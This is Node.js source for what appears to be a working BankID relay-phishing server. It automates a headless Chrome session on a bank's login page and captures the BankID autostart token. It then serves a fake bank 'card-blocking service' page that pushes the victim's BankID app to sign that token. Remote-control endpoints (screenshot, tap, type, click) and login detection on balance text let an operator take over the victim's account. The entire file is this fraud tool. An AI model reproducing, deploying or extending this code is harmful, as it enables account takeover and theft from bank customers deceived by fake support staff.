const http = require('http');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');

const PORT = process.env.PORT || 3000;
const CDP = 'http://127.0.0.1:' + (process.env.CDP_PORT || 9222);
const PUBLIC = process.env.PUBLIC_URL || '';
const FIL = path.join(__dirname, 'sessioner.json');
const LOGG = path.join(__dirname, 'logg.jsonl');
const LAR = path.join(__dirname, 'lar.json');

let banker = {};
try { banker = JSON.parse(fs.readFileSync(path.join(__dirname, 'banker.json'), 'utf8')); } catch (e) { banker = {}; }
if (!banker.fri) banker.fri = { namn: 'Egen', farg: '#0b5cab', start: '', efter: '', klick: [], inloggad: ['Saldo', 'Konto', 'Logga ut'] };

let lar = {};
try { lar = JSON.parse(fs.readFileSync(LAR, 'utf8')); } catch (e) { lar = {}; }

let S = {}, aktiv = {}, dirty = false;
try {
  const j = JSON.parse(fs.readFileSync(FIL, 'utf8'));
  if (j && j.S) { S = j.S; aktiv = j.aktiv || {}; } else { S = j || {}; }
} catch (e) { S = {}; }

const loggRader = [];
function logg(txt) {
  const rad = new Date().toISOString().substr(11, 8) + '  ' + txt;
  loggRader.push(rad);
  while (loggRader.length > 200) loggRader.shift();
  try { fs.appendFileSync(LOGG, new Date().toISOString() + ' ' + txt + '\n'); } catch (e) {}
  console.log(txt);
}

function fixUrl(x) {
  if (!x) return x;
  if (/^[a-z]+:\/\//i.test(x)) return x;
  if (/^(about|data|file):/i.test(x)) return x;
  return 'https://' + x.replace(/^\/+/, '');
}

function spara() { dirty = true; }
setInterval(() => {
  if (!dirty) return;
  dirty = false;
  try { fs.writeFileSync(FIL, JSON.stringify({ S, aktiv })); } catch (e) {}
  try { fs.writeFileSync(LAR, JSON.stringify(lar)); } catch (e) {}
}, 2000);

function larIn(bank, url) {
  try {
    const u = new URL(url);
    const pre = u.host + u.pathname.replace(/\/[^/]*$/, '');
    if (!lar[bank]) lar[bank] = [];
    if (lar[bank].indexOf(pre) < 0 && lar[bank].length < 12) { lar[bank].push(pre); spara(); }
  } catch (e) {}
}

let vp = { w: 412, h: 900 };
let chromeOk = false;
const sidor = new Map();

function nySida(bank) {
  return { bank, ws: null, kopplad: false, mid: 0, vantar: new Map(), lyssnare: {} };
}

function cdpP(s, metod, params) {
  return new Promise((resolve, reject) => {
    if (!s.ws || s.ws.readyState !== 1) return reject(new Error('ingen sida'));
    const id = ++s.mid;
    const t = setTimeout(() => {
      if (s.vantar.has(id)) { s.vantar.delete(id); reject(new Error('timeout ' + metod)); }
    }, 20000);
    s.vantar.set(id, {
      resolve: (v) => { clearTimeout(t); resolve(v); },
      reject: (e) => { clearTimeout(t); reject(e); }
    });
    s.ws.send(JSON.stringify({ id, method: metod, params: params || {} }));
  });
}

function paP(s, metod, fn) { (s.lyssnare[metod] = s.lyssnare[metod] || []).push(fn); }

function hamtaJSON(url, metod) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = http.request(
      { hostname: u.hostname, port: u.port, path: u.pathname + u.search, method: metod || 'GET' },
      (r) => {
        let d = '';
        r.on('data', (c) => d += c);
        r.on('end', () => { try { resolve(JSON.parse(d)); } catch (e) { reject(e); } });
      });
    req.on('error', reject);
    req.setTimeout(4000, () => req.destroy(new Error('timeout')));
    req.end();
  });
}

async function chromeNere() {
  try { await hamtaJSON(CDP + '/json/version'); return false; } catch (e) { return true; }
}

async function sattViewportSida(s) {
  await cdpP(s, 'Emulation.setDeviceMetricsOverride',
    { width: vp.w, height: vp.h, deviceScaleFactor: 1, mobile: true });
  await cdpP(s, 'Emulation.setTouchEmulationEnabled', { enabled: true, maxTouchPoints: 1 });
}

function urUrl(u) {
  const m = /[?&]autostarttoken=([^&#]+)/i.exec(u || '');
  return m ? decodeURIComponent(m[1]) : null;
}

function tokenFran(bank, t, kalla, url) {
  if (!t) return;
  const kod = aktiv[bank];
  if (!kod || !S[kod]) { logg('token utan session (' + bank + ')'); return; }
  const s = S[kod];
  if (s.token === t) return;
  s.token = t;
  s.tokenTid = Date.now();
  s.bankidSkickad = false;
  s.kalla = kalla;
  spara();
  if (url) larIn(bank, url);
  logg('TOKEN ' + bank + ' ' + kod + ' [' + kalla + '] ' + t.slice(0, 8) +
    (url ? '  ' + url.slice(0, 100) : ''));
}

function kopplaLyssnare(s) {
  s.ws.on('message', (d) => {
    let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
    if (m.id && s.vantar.has(m.id)) {
      const v = s.vantar.get(m.id); s.vantar.delete(m.id);
      if (m.error) v.reject(new Error(m.error.message)); else v.resolve(m.result);
      return;
    }
    if (m.method) {
      const l = s.lyssnare[m.method];
      if (l) for (const f of l) { try { f(m.params); } catch (e) {} }
    }
  });
  s.ws.on('close', () => { s.kopplad = false; });

  paP(s, 'Network.requestWillBeSent', (p) => {
    const u = p && p.request && p.request.url;
    if (u && (u.indexOf('bankid://') === 0 || u.indexOf('intent:') === 0)) {
      tokenFran(s.bank, urUrl(u), 'deeplink', u);
    }
  });

  paP(s, 'Page.frameRequestedNavigation', (p) => {
    if (p && p.url) { const t = urUrl(p.url); if (t) tokenFran(s.bank, t, 'frame', p.url); }
  });

  paP(s, 'Network.responseReceived', (p) => {
    const r = p && p.response;
    if (!r || !r.url) return;
    if ((r.encodedDataLength || 0) > 400000) return;
    if (/\.(png|jpg|jpeg|gif|webp|css|woff2?|svg|ico)(\?|$)/i.test(r.url)) return;
    const mt = (r.mimeType || '').toLowerCase();
    const kand = /json|text|javascript/.test(mt) ||
      (lar[s.bank] || []).some((pre) => r.url.indexOf(pre) === 0);
    if (!kand) return;
    cdpP(s, 'Network.getResponseBody', { requestId: p.requestId }).then((b) => {
      const txt = b.base64Encoded ? Buffer.from(b.body, 'base64').toString('utf8') : b.body;
      if (!/autostarttoken/i.test(txt)) return;
      const m = /"autoStartToken"\s*:\s*"([^"]+)"/i.exec(txt);
      if (m) tokenFran(s.bank, m[1], 'svar', r.url);
    }).catch(() => {});
  });
}

async function skaffaSida(bank) {
  let s = sidor.get(bank);
  if (s && s.ws && s.ws.readyState === 1) return s;
  s = nySida(bank);
  sidor.set(bank, s);
  const start = (banker[bank] && banker[bank].start) || 'about:blank';
  const mal = await hamtaJSON(CDP + '/json/new?' + encodeURIComponent(start || 'about:blank'), 'PUT');
  const sock = new WebSocket(mal.webSocketDebuggerUrl, { perMessageDeflate: false });
  s.ws = sock;
  await new Promise((res, rej) => {
    const t = setTimeout(() => rej(new Error('ws-timeout')), 8000);
    sock.on('open', () => { clearTimeout(t); res(); });
    sock.on('error', (e) => { clearTimeout(t); rej(e); });
  });
  s.kopplad = true;
  chromeOk = true;
  kopplaLyssnare(s);
  await cdpP(s, 'Page.enable');
  await cdpP(s, 'Network.enable');
  await cdpP(s, 'Runtime.enable');
  await sattViewportSida(s);
  logg('ny flik: ' + bank);
  return s;
}

async function korsKlick(s, bank) {
  const steg = (banker[bank] && banker[bank].klick) || [];
  for (const sel of steg) {
    await new Promise((r) => setTimeout(r, 1800));
    try {
      await cdpP(s, 'Runtime.evaluate', {
        expression: 'try{(function(){var e=document.querySelector(' + JSON.stringify(sel) +
          ');if(e){e.click();return 1}return 0})()}catch(x){0}',
        returnByValue: true
      });
    } catch (e) {}
  }
}

async function nyOrder(bank, kod, orsak) {
  const s = S[kod];
  if (!s) return;
  try {
    const p = await skaffaSida(bank);
    const fore = await cdpP(p, 'Runtime.evaluate',
      { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
    const url = fixUrl((banker[bank] && banker[bank].start) || s.url || 'about:blank');
    await cdpP(p, 'Page.navigate', { url: url || 'about:blank' });
    await new Promise((r) => setTimeout(r, 900));
    const efter = await cdpP(p, 'Runtime.evaluate',
      { expression: 'location.href', returnByValue: true }).then((r) => r.result.value).catch(() => '');
    if (efter === fore) await cdpP(p, 'Page.reload', { ignoreCache: true });
    korsKlick(p, bank);
    s.token = null; s.bankidSkickad = false; s.inloggad = false;
    s.omOrdning = (s.omOrdning || 0) + 1;
    s.omOrdningTid = Date.now();
    spara();
    logg('NY ORDER ' + bank + ' ' + kod + ' (' + orsak + ') -> ' + url);
  } catch (e) { logg('nyorder-fel ' + e.message); }
}

setInterval(() => {
  const nu = Date.now();
  for (const bank of Object.keys(aktiv)) {
    const s = S[aktiv[bank]];
    if (!s || s.inloggad || s.signed) continue;
    if (!s.token || s.bankidSkickad) continue;
    if (nu - (s.tokenTid || 0) < 26000) continue;
    if (s.omOrdningTid && nu - s.omOrdningTid < 20000) continue;
    nyOrder(bank, s.code, 'vakt');
  }
}, 4000);

setInterval(async () => {
  for (const bank of Object.keys(aktiv)) {
    const s = S[aktiv[bank]];
    if (!s || s.inloggad) continue;
    if (Date.now() - (s.skapad || 0) < 5000) continue;
    try {
      const p = await skaffaSida(bank);
      const r = await cdpP(p, 'Runtime.evaluate', {
        expression: "JSON.stringify({u:location.href,t:(document.body?document.body.innerText:'').slice(0,700)})",
        returnByValue: true
      });
      const o = JSON.parse(r.result.value || '{}');
      const mark = (banker[bank] && banker[bank].inloggad) || ['Saldo', 'Konto', 'Logga ut'];
      const txt = (o.t || '');
      if (mark.some((m) => txt.toLowerCase().indexOf(m.toLowerCase()) >= 0)) {
        s.inloggad = true; s.inloggadTid = Date.now();
        s.sida = o.u; s.text = txt.replace(/\s+/g, ' ').slice(0, 180);
        spara();
        logg('INLOGGAD ' + bank + ' ' + s.code + ' ' + o.u);
      } else if (s.signed && !s.efterLast && Date.now() - (s.signeradTid || 0) > 6000) {
        s.efterLast = true;
        const e = (banker[bank] && banker[bank].efter) || '';
        if (e && o.u !== e) { cdpP(p, 'Page.navigate', { url: e }).catch(() => {}); logg('laddar efter-sida ' + bank); }
      }
    } catch (e) {}
  }
}, 3000);

setInterval(async () => { chromeOk = !(await chromeNere()); }, 5000);
setTimeout(async () => { chromeOk = !(await chromeNere()); }, 600);

function nyKod() {
  const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let k;
  do {
    k = '';
    for (let i = 0; i < 5; i++) k += A[Math.floor(Math.random() * A.length)];
  } while (S[k]);
  return k;
}

function svar(res, o, sc) {
  res.writeHead(sc || 200, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Cache-Control': 'no-store'
  });
  res.end(JSON.stringify(o));
}

function kropp(req) {
  return new Promise((r) => { let d = ''; req.on('data', (c) => d += c); req.on('end', () => r(d)); });
}

function las(namn) {
  try { return fs.readFileSync(path.join(__dirname, namn), 'utf8'); } catch (e) { return 'saknas: ' + namn; }
}

function html(res, t) {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
  res.end(t);
}

function lankTill(kod) {
  return (PUBLIC ? PUBLIC.replace(/\/+$/, '') : '') + '/b?code=' + kod;
}

http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://x');
  const p = u.pathname;

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Methods': '*'
    });
    return res.end();
  }

  if (p === '/') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('relay ok' + (chromeOk ? ' + chrome' : ' (chrome ej kopplad)'));
  }

  if (p === '/api/halsa') {
    return svar(res, { ok: true, chrome: chromeOk, url: PUBLIC || null });
  }

  if (p === '/api/banker') {
    const lista = Object.keys(banker).map((k) => ({
      nyckel: k, namn: banker[k].namn || k, start: banker[k].start || ''
    }));
    return svar(res, { ok: true, banker: lista });
  }

  if (p === '/api/logg') return svar(res, { ok: true, rader: loggRader.slice(-20) });

  if (p === '/logg') {
    const r = loggRader.slice(-150).reverse().map((x) => '<div>' + x + '</div>').join('');
    return html(res, '<!doctype html><meta charset="utf-8">' +
      '<meta name="viewport" content="width=device-width,initial-scale=1">' +
      '<title>Logg</title><style>body{background:#0f1419;color:#e2e8f0;font:13px monospace;padding:10px}' +
      'div{padding:2px 0;border-bottom:1px solid #1e293b}</style><h3>Logg</h3>' + r);
  }

  if (p === '/b') {
    const k = (u.searchParams.get('code') || '').toUpperCase();
    const s = S[k];
    const b = s ? (banker[s.bank] || {}) : {};
    const namn = b.namn || 'BankID';
    const farg = b.farg || '#0b5cab';
    if (!s) {
      return html(res, '<!doctype html><meta charset="utf-8">' +
        '<meta name="viewport" content="width=device-width,initial-scale=1"><title>' + namn + '</title>' +
        '<style>body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;' +
        'color:#12212e;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
        '.k{background:#fff;border-radius:16px;padding:28px 22px;width:86%;max-width:390px;' +
        'box-shadow:0 8px 28px rgba(0,0,0,.12)}h1{font-size:19px;margin:0 0 10px}</style>' +
        '<div class="k"><h1>' + namn + '</h1><p>Koden hittades inte. Be supporten igen.</p></div>');
    }
    return html(res, '<!doctype html><html lang="sv"><head><meta charset="utf-8">' +
      '<meta name="viewport" content="width=device-width,initial-scale=1">' +
      '<title>' + namn + '</title><style>' +
      'body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;color:#12212e;' +
      'display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
      '.k{background:#fff;border-radius:16px;width:86%;max-width:390px;overflow:hidden;' +
      'box-shadow:0 8px 28px rgba(0,0,0,.12)}' +
      '.topp{background:' + farg + ';color:#fff;padding:14px;font-weight:600;font-size:17px}' +
      '.in{padding:26px 20px}.s{width:46px;height:46px;border:4px solid #d7dee6;border-top-color:' + farg + ';' +
      'border-radius:50%;margin:0 auto 16px;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}' +
      'p{font-size:15px;line-height:1.45;margin:6px 0}' +
      'a.kn{display:none;margin:16px auto 0;padding:13px 22px;background:' + farg + ';color:#fff;' +
      'text-decoration:none;border-radius:10px;font-size:16px}' +
      '.fel{background:#fed7d7;color:#822727;border-radius:8px;padding:9px;font-size:13px;margin:12px 0;display:none}' +
      '.liten{color:#5a6a7a;font-size:12.5px;margin-top:14px}</style></head><body>' +
      '<div class="k"><div class="topp">' + namn + ' - Spärrtjänst</div><div class="in">' +
      '<div class="s"></div><p id="txt">Vantar pa order...</p>' +
      '<div class="fel" id="fel"></div>' +
      '<a class="kn" id="oppna" href="#">Oppna BankID</a>' +
      '<p class="liten">Sidan fortsatter sjalv. Har du inte BankID installerat, tryck pa knappen.</p>' +
      '</div></div><script>' +
      'var K=' + JSON.stringify(k) + ',N="b_"+K;' +
      'function fel(t){var e=document.getElementById("fel");e.textContent=t;e.style.display="block";}' +
      'function rensa(){document.getElementById("fel").style.display="none";}' +
      'async function kolla(){' +
      'try{' +
      'var r=await fetch("/api/poll?code="+K+"&t="+Date.now());' +
      'if(!r.ok){fel("Sessionen finns inte langre.");}' +
      'else{var d=await r.json();rensa();' +
      'if(d.inloggad){document.getElementById("txt").textContent="Klart! Du kan lagga ner.";}' +
      'else if(d.token){' +
      'var a=document.getElementById("oppna");' +
      'a.href="bankid:///?autostarttoken="+encodeURIComponent(d.token)+"&redirect=null";' +
      'a.style.display="inline-block";' +
      'if(sessionStorage.getItem(N)!==d.token){sessionStorage.setItem(N,d.token);' +
      'document.getElementById("txt").textContent="Oppnar BankID...";location.href=a.href;}' +
      'else{document.getElementById("txt").textContent="Signera i BankID-appen.";}' +
      '}else{document.getElementById("txt").textContent="Vantar pa order...";}' +
      '}}catch(e){fel("Tappade kontakten. Forsoker igen.");}' +
      'setTimeout(kolla,1500);}' +
      'kolla();</script></body></html>');
  }

  if (p === '/k' || p === '/k.html') return html(res, las('k.html'));

  if (p === '/api/kor' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    let bank = String(d.bank || 'fri');
    if (!banker[bank]) bank = 'fri';
    if (bank === 'fri' && d.url) banker.fri.start = fixUrl(d.url);
    const k = nyKod();
    S[k] = {
      code: k, bank, token: null, signed: false, inloggad: false,
      skapad: Date.now(), url: d.url || null
    };
    aktiv[bank] = k;
    spara();
    logg('KOR ' + bank + ' ' + k + ' ' + (banker[bank].start || '(ingen url)'));
    nyOrder(bank, k, 'kor');
    return svar(res, { ok: true, code: k, bank, lank: lankTill(k), chrome: chromeOk });
  }

  if (p === '/api/nyorder' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    const s = S[d.code];
    if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
    nyOrder(s.bank, d.code, 'knapp');
    return svar(res, { ok: true });
  }

  if (p === '/api/token' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    const s = S[d.code];
    if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
    s.token = d.token || null;
    s.tokenTid = Date.now();
    s.bankidSkickad = false;
    s.kalla = 'manuell';
    aktiv[s.bank] = d.code;
    spara();
    logg('TOKEN (manuell) ' + d.code + ' ' + String(s.token).slice(0, 8));
    return svar(res, { ok: true });
  }

  if (p === '/api/skarm') {
    const bank = u.searchParams.get('bank') || '';
    if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
    try {
      const p2 = await skaffaSida(bank);
      const r = await cdpP(p2, 'Page.captureScreenshot',
        { format: 'jpeg', quality: 58, captureBeyondViewport: false });
      return svar(res, { ok: true, bild: r.data, w: vp.w, h: vp.h });
    } catch (e) { return svar(res, { ok: false, fel: e.message }); }
  }

  const enkel = async (res, fn) => {
    const d = JSON.parse((await kropp(req)) || '{}');
    if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
    try {
      const p2 = await skaffaSida(d.bank || '');
      await fn(p2, d);
      return svar(res, { ok: true });
    } catch (e) { return svar(res, { ok: false, fel: e.message }); }
  };

  if (p === '/api/peka' && req.method === 'POST') return enkel(res, async (s, d) => {
    await cdpP(s, 'Input.dispatchTouchEvent',
      { type: 'touchStart', touchPoints: [{ x: Number(d.x) || 0, y: Number(d.y) || 0 }] });
    await cdpP(s, 'Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
  });

  if (p === '/api/rulla' && req.method === 'POST') return enkel(res, async (s, d) => {
    await cdpP(s, 'Input.dispatchMouseEvent', {
      type: 'mouseWheel', x: Number(d.x) || 0, y: Number(d.y) || 0,
      deltaX: 0, deltaY: Number(d.dy) || 0
    });
  });

  if (p === '/api/text' && req.method === 'POST') return enkel(res, async (s, d) => {
    await cdpP(s, 'Input.insertText', { text: String(d.t || '') });
  });

  if (p === '/api/klick' && req.method === 'POST') return enkel(res, async (s, d) => {
    await cdpP(s, 'Runtime.evaluate', {
      expression: 'try{(function(){var e=document.querySelector(' + JSON.stringify(String(d.sel || '')) +
        ');if(e)e.click();return !!e})()}catch(x){false}',
      returnByValue: true
    });
  });

  if (p === '/api/tangent' && req.method === 'POST') return enkel(res, async (s, d) => {
    const map = {
      enter: { vk: 13, key: 'Enter', code: 'Enter', txt: '\r' },
      tab: { vk: 9, key: 'Tab', code: 'Tab' },
      back: { vk: 8, key: 'Backspace', code: 'Backspace' },
      esc: { vk: 27, key: 'Escape', code: 'Escape' }
    };
    const v = map[String(d.k || '')];
    if (!v) throw new Error('okand tangent');
    await cdpP(s, 'Input.dispatchKeyEvent',
      { type: 'rawKeyDown', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code });
    if (v.txt) await cdpP(s, 'Input.dispatchKeyEvent', { type: 'char', text: v.txt, key: v.key });
    await cdpP(s, 'Input.dispatchKeyEvent',
      { type: 'keyUp', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code });
  });

  if (p === '/api/viewport' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    vp.w = Math.max(200, Math.min(1200, Number(d.w) || 412));
    vp.h = Math.max(300, Math.min(2200, Number(d.h) || 900));
    for (const s of sidor.values()) { try { await sattViewportSida(s); } catch (e) {} }
    return svar(res, { ok: true, w: vp.w, h: vp.h });
  }

  if (p === '/api/state') {
    const s = S[u.searchParams.get('code')];
    if (!s) return svar(res, { ok: false, chrome: chromeOk }, 404);
    return svar(res, {
      ok: true,
      token: !!s.token,
      signed: !!s.signed,
      inloggad: !!s.inloggad,
      chrome: chromeOk,
      bank: s.bank,
      sida: s.sida || null,
      omOrdning: s.omOrdning || 0
    });
  }

  if (p === '/api/poll') {
    const s = S[u.searchParams.get('code')];
    if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
    return svar(res, { ok: true, token: s.token, signed: !!s.signed, inloggad: !!s.inloggad });
  }

  if (p === '/api/signed' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    const s = S[d.code];
    if (!s) return svar(res, { ok: false }, 404);
    s.signed = true; s.signeradTid = Date.now(); spara();
    logg('SIGNERAD ' + s.bank + ' ' + d.code);
    return svar(res, { ok: true });
  }

  if (p === '/api/join' && req.method === 'POST') {
    const d = JSON.parse((await kropp(req)) || '{}');
    const k = String(d.code || '').toUpperCase();
    if (!S[k]) return svar(res, { ok: false, fel: 'fel kod' }, 404);
    return svar(res, { ok: true });
  }

  res.writeHead(404);
  res.end('nej');
}).listen(PORT, '0.0.0.0', () => logg('relay lyssnar pa ' + PORT + ' url=' + (PUBLIC || '(ingen)')));
